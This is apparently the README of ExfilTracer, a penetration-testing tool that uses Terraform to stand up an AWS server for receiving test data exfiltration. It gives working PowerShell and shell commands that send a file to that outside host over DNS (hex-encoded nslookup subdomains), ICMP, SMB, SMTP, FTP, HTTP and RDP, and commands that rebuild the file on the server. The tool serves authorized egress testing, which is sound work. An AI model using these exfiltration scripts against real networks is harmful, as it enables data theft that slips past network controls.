# ExfilTracer
## Table of Contents

- [Summary](#summary)
- [Deploying the cloud server](#deploying-the-cloud-server)
  - [Prerequisites](#prerequisites)
  - [Setup](#setup)
  - [Deployment Procedure](#deployment-procedure)
  - [Parameters](#parameters)
- [Testing Exfiltration](#testing-exfiltration)
  - [Create Exfiltration Data](#create-exfiltration-data)
  - [Connect to the server](#connect-to-the-server)
  - [DNS Exfiltration](#dns-exfiltration)
  - [FTP Exfiltration](#ftp-exfiltration)
  - [HTTP Exfiltration](#http-exfiltration)
  - [ICMP Exfiltration](#icmp-exfiltration)
  - [RDP Exfiltration](#rdp-exfiltration)
  - [SMB Exfiltration](#smb-exfiltration)
  - [SMTP Exfiltration](#smtp-exfiltration)
- [References](#references)
## Summary

ExfilTracer creates a cloud service to facilitate easy testing of data exfiltration methods during a penetration test. This project utilizes Ansible & Terraform to build a temporary disposable EC2 cloud server and DNS records in AWS. Where possible services will be secured using a password specified at run time along with IP address whitelisting on the AWS side if desired. Encryption for those protocols that don't natively support it has not been implemented and likely will not be. 

The created resources will be

- 1 x **EC2 instance** (Unless specified by parameter default size is t2.micro)
- 1 x **Security Group** (With ports opened to allow exfiltration service can be restricted to a single IP address with a parameter)
- 1 x **DNS A record** in the root domain specified pointing to the public IP address of the EC2 instance. This follows the pattern exfiltracer`client_ID`.`root_domain`. So in the given example with my domain `hulkgosmash.com` and the default value of `123` for the client_ID this will be `exfiltracer123.hulkgosmash.com`
- 1 x **DNS NS record** pointing to the previous A record following the pattern ns.exfiltracer`client_ID`. `root_domain`. So in this example that will be `ns.exfiltracer123.hulkgosmash.com`

------

**Don’t send sensitive data using this server, generate some random junk files and send those as a proof of concept.** 

------

## Deploying the cloud server

### Prerequisites

#### Packages

All testing was completed using a default installation of Kali version 2024.2.

- Ansible - `sudo apt install ansible`
- AWS CLI
- Terraform - `sudo apt install terraform`

#### Resources

- AWS Account
- AWS Hosted Domain Name
- SSH Private / Public key pair. Use `ssh-keygen` or something similar to create. Note if not using the default path this will have to be specified using the `public_key_path` & `private_key_path` parameters listed below.

### Setup

#### AWS CLI Installation

For more details or other operating systems see documentation. 

https://docs.aws.amazon.com/cli/v1/userguide/install-linux.html

```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

![Description of the image](images/2.png)

![Description of the image](images/3.png)

#### AWS CLI Configuration

Run configuration command and enter details of the your access key. 

```bash
aws configure
```

![Description of the image](images/1.png)

### Deployment Procedure

1. Clone the repository

```bash
git clone https://github.com/hulkgosmash/ExfilTracer.git
```

![Description of the image](images/4.png)

2. Change to the directory and initialize it with Terraform.

```bash
cd ExfilTracer
terraform init
```

![Description of the image](images/5.png)

3. Deploy server using Terraform (Minimum parameters).

```bash
terraform apply -var="root_domain=hulkgosmash.com" -auto-approve
```

![Description of the image](images/6.png)

![Description of the image](images/7.png)

4. Deploy server using Terraform (Using all parameters). 


````bash
terraform apply -var="client_ID=test" -var="instance_type=t2.small" -var="ip_Address=1.1.1.1/32" -var="password=ZtHu@4LskWLner" -var="public_key_path=/home/kali/.ssh/id_rsa.pub" -var="private_key_path=/home/kali/.ssh/id_rsa" -var="region=us-east-1" -var="root_domain=hulkgosmash.com" -auto-approve
````

### Removal / Destroy Procedure

This will remove all resources (EC2 instance / DNS records)

```bash
terraform destroy -auto-approve
```

![Description of the image](images/8.png)

### Parameters

**client_ID**

- Name: `client_ID`
- Type: `String`
- Default: `123`
- Description: A unique value, to differentiate multiple deployments into the same AWS account.
- Mandatory: `No`

**instance_type**

- Name: `instance_type`
- Type: `String`
- Default: `t2.micro`
- Description: AWS Instance type, t2.micro seems to be sufficient. Larger sizes should be fine however smaller sizes may have problems if testing RDP. 
- Mandatory: `No`

**ip_Address**

- Name: `ip_Address`
- Type: `String`
- Default: `0.0.0.0/0`
- Description: IP Address to restrict traffic to. If not specified the ExfilTracer server will accept traffic from all IP addresses. To restrict traffic to a single IP Address set the value to something like `1.1.1.1/32` Where `1.1.1.1` would be the external IP Address of the system to be tested. **Note: ports 22 (SSH) & 53 (DNS) are not subject to the restrictions.** 
- Mandatory: `No`

**password**

- Name: `password`
- Type: `String`
- Default: `P@ssw0rd`
- Description: A password used to configure the accounts for the FTP, RDP & SMB services on the ExfilTracer server. It's best to set this to a secure value you have generated yourself. 
- Mandatory: `No`

**public_key_path**

- Name: `public_key_path`
- Type: `String`
- Default: `/home/kali/.ssh/id_rsa.pub`
- Description: The full path to the public SSH key file. If you don't have an SSH key you need to generate one. 
- Mandatory: `No`

**private_key_path**

- Name: `private_key_path`
- Type: `String`
- Default: `/home/kali/.ssh/id_rsa`
- Description: The full path to the private SSH key file. If you don't have an SSH key you need to generate one. 
- Mandatory: `No`

**region**

- Name: `region`
- Type: `String`
- Default: `ap-southeast-2`
- Description: The AWS region that the EC2 instance & Security group will be created in. 
- Mandatory: `No`

**root_domain**

- Name: `root_domain`
- Type: `String`
- Default: `hulkgosmash.com`
- Description: The AWS hosted root domain. You will definitely need to set and change this value. 
- Mandatory: `Yes`

## Testing Exfiltration
Testing will require the use of PowerShell for many protocols. All of the referenced scripts will be provided inline in this readme as well and being stored in the /scripts sub-directory. All testing examples shown below were performed on Windows 11 22H2 with all updates installed as of 26/07/2024. 

### Create Exfiltration Data

Copy and paste the below script into a PowerShell window to generate some random data to be exfiltrated. The script will also generate a hash so that we can verify the consistency of the data after it has been exfiltrated. In this example the file `exfil.txt` will be created in the root directory of the current user profile which is the directory PowerShell will likely load by default. 

```powershell
$base64String = ''
while ($base64String.Length -lt 1024) {
    $randomBytes = New-Object byte[] 512
    $rand = New-Object System.Random
    $rand.NextBytes($randomBytes)
    $base64String += [Convert]::ToBase64String($randomBytes)
}
# Trim the string to ensure it's exactly 1024 bytes
$base64String = $base64String.Substring(0, 1024)
# Set file path
$filePath = "$env:USERPROFILE\exfil.txt"
# Write base64 string to file
Set-Content -Path $filePath -Value $base64String -Encoding ASCII
# Get file hash
Get-FileHash -Path $filePath
```
![Description of the image](images/10.png)

### Connect to the server

Using the output from the Terraform build command we can find the required command to connect to the server. Enter yes to continue connecting then elevate to the root account. 

![Description of the image](images/11.png)

```bash
ssh ubuntu@exfiltracer123.hulkgosmash.com
yes
sudo su
```

![Description of the image](images/12.png)

### DNS Exfiltration

On the server run the below command. 

```bash
tcpdump -n udp port 53 -i any | tee raw_output.txt
```

![Description of the image](images/13.png)

On the client to be tested open PowerShell ISE and copy the contents of the script `DNS_Exfiltration.ps1` located in the scripts folder of this repository. Take note of the `$domain` variable as this will need to be updated to match the value shown in the output of the terraform command. 

```powershell
$domain = 'exfiltracer123.hulkgosmash.com'
$ns = "ns.$domain"
certutil -encodehex -f $env:USERPROFILE\exfil.txt $env:USERPROFILE\exfil.hex 4

$text=Get-Content $env:USERPROFILE\exfil.hex
$subdomain=$text.replace(" ","")
$j=11111
foreach($i in $subdomain) {
    $final=$j.tostring()+"."+$i+".$ns"
    $j += 1
    Start-Process -NoNewWindow nslookup $final 
}
```

![Description of the image](images/14.png)

One you have updated the `$domain` variable click on the green play button to execute the script. 

![Description of the image](images/15.png)

On the server you should see a bunch of DNS requests coming through wait a few minutes to ensure that it has stopped then hit `ctrl+c`. 

![Description of the image](images/16.png)

Run the below command on the server to recover the file. 

```bash
grep -oP '[0-9]{5}\.[0-9a-f]+\.[^.]*\.[a-z]+'  raw_output.txt | sort -u | cut -d "." -f2 | xxd -r -p > dns_exfil.txt
```

![Description of the image](images/17.png)

Verify the hash

```bash
sha256sum dns_exfil.txt
```

![Description of the image](images/53.png)

### FTP Exfiltration

Open File Explorer and in the address bar type in `ftp://` followed by the domain as shown in the output from terraform. 

![Description of the image](images/18.png)

When prompted enter the username as `ftpuser` and if you specified a password as a terraform parameter it will be this otherwise it will be the default value of `P@ssw0rd`. 

![Description of the image](images/19.png)

FTP to a public FTP site may be blocked by default on Windows. If you have Administrator access you can click Allow access on the prompt below. 

![Description of the image](images/20.png)

Click on the `+` icon in the open File Explorer window to open an additional tab. 

![Description of the image](images/21.png)

Navigate to the user profile directory then right click on the `exfil.txt` file and select the copy icon. 

![Description of the image](images/22.png)

Left click on the FTP tab then right click and select the `paste` icon. 

![Description of the image](images/23.png)

You should then see that the file has been uploaded to the FTP service of the AWS EC2 instance. 

![Description of the image](images/24.png)

We can then use the below code to verify the file on the server. 

```bash
sha256sum /home/ftpuser/exfil.txt
```

![Description of the image](images/25.png)

### HTTP Exfiltration
Open a web browser and navigate to the URL of the subdomain that was created during deployment. Click on the `Choose File` button.

![Description of the image](images/26.png)

Select the `exfil.txt` file from the user profile directory and once the file has been selected click on the `Upload File` button. 

![Description of the image](images/27.png)

You should see confirmation that the file has been uploaded. 

![Description of the image](images/28.png)

Back on the server locate the file in the `/var/www/html/uploads` directory it will have been renamed with a random value appended to the front. The verify the file has been uploaded using the `sha256sum` command. 

```bash
ls /var/www/html/uploads
sha256sum /var/www/html/uploads/66a37d9f055ab-exfil.txt
```

![Description of the image](images/29.png)

### ICMP Exfiltration

On the client in the open PowerShell ISE window type the below command to find out the external IP address is. 
```powershell
(curl ifconfig.me).Content
```

![Description of the image](images/31.png)

On the server run the below commands to get the server setup to receive the file. Be sure to substitute the IP address with the one gathered in the above command. 

```bash
cd /home/ubuntu/ICMP-TransferTools/
python3 ICMP-ReceiveFile.py 5.62.23.6 exfil.txt
```

![Description of the image](images/32.png)

On the client import copy and paste the function listed here https://github.com/icyguider/ICMP-TransferTools/blob/main/Invoke-IcmpUpload.ps1 (Also co-located in the scripts directory of this repository) into PowerShell ISE. Then click on the green play button. 

![Description of the image](images/30.png)

On the client send the file using the below command be sure to substitute the domain for the one shown in the output of the Terraform deployment. 

```powershell
Invoke-IcmpUpload -IPAddress exfiltracer123.hulkgosmash.com -file .\exfil.txt
```

![Description of the image](images/33.png)

Back on the server it will automatically detect once the file transfer has completed and terminate the program. Then we just need to verify the hash with the below command. 

```bash
sha256sum exfil.txt
```

![Description of the image](images/34.png)

### RDP Exfiltration

**Note RDP can be somewhat unreliabe on the linux server. If it locks up try rebooting the server and it may be required to disable audio settings on the RDP client** 

On the client open up the remote desktop client by opening the run dialog box and typing `mstsc`. 

![Description of the image](images/35.png)

Enter the Domain name. Then click on the `Show Options` button. 

![Description of the image](images/36.png)

Click on the `Local Resources` tab then ensure the `Printers` option is deselected. Then click on `More`. 

![Description of the image](images/37.png)

Expand the Drives node and ensure that the option `Local Disk (C:)` is selected. Also ensure that the options `Smart cards or Windows Hello for Business` & `WebAuth (Windows Hello or security keys)` are both deselected if they exist then click on `OK`.

![Description of the image](images/39.png)

Click on `Connect`.

![Description of the image](images/40.png)

When prompted click on `Connect`.

![Description of the image](images/41.png)

Click on `Yes`.

![Description of the image](images/42.png)

When prompted enter the username of `rdpuser` and if you specified a password as a terraform parameter it will be this otherwise it will be the default value of `P@ssw0rd` then click `OK`. 

![Description of the image](images/43.png)

Once the desktop loads click on the `Home` button on the desktop. Once the explorer window opens under devices click on the one that starts with `thinkclient_dr…`. Then navigate through the file system to find the `exil.txt` file that was created earlier. Then right click on the file and select `Copy`.

![Description of the image](images/44.png)

Right click on the Desktop and select Paste.

![Description of the image](images/45.png)

The file should then be shown on the desktop. 

![Description of the image](images/46.png)

On the server verify the hash. 

```bash
sha256sum /home/rdpuser/Desktop/exfil.txt
```

![Description of the image](images/47.png)

### SMB Exfiltration

Be sure to modify the domain in the `net use x: \\exfiltracer123.hulkgosmash.com\share /user:smbuser` statement to match your own then copy the file. As before if not specified as a Terraform parameter the password will be `P@ssw0rd`. 

```powershell
net use x: \\exfiltracer123.hulkgosmash.com\share /user:smbuser
copy exfil.txt X:\exfil.txt
net use x: /d
```

![Description of the image](images/48.png)

Verify the file hash on the server. 

```bash
sha256sum /home/smbuser/exfil.txt
```

![Description of the image](images/49.png)

### SMTP Exfiltration

On the client open a PowerShell ISE window and paste the below code. Ensure you modify the `$SMTPServer = "exfiltracer123.hulkgosmash.com"` statement to match your own domain. Then click on the green play button to run the script. 

```powershell
$SMTPServer = "exfiltracer123.hulkgosmash.com"
$SMTPFrom = "test@example.com"
$SMTPTo = "root@localhost"
$MessageSubject = "Test Email"
$MessageBody = "This is a test email sent from PowerShell."
Send-MailMessage -SmtpServer $SMTPServer `
                 -From $SMTPFrom `
                 -To $SMTPTo `
                 -Subject $MessageSubject `
                 -Body $MessageBody `
                 -Attachments .\exfil.txt
```

![Description of the image](images/50.png)

On the server firstly verify that the mail has been received. 

```bash
cat /var/mail/root
```

![Description of the image](images/51.png)

Then extract the file and verify the hash. 

```bash
cd /var/mail
ripmime -i root -d .
sha256sum exfil.txt
```

![Description of the image](images/52.png)

## References
A big thanks to the below blogs & projects and any others I have forgotten to mention for sharing your work so that others may use it and build upon it for their own projects. 

* https://abawazeeer.medium.com/powershell-data-ex-filtration-over-dns-oob-9efcd5ed249f
* https://medium.com/@meshal_/dns-exfiltration-by-living-of-f-the-land-technique-w-o-poweshell-bd50bd1a1918
* https://github.com/icyguider/ICMP-TransferTools/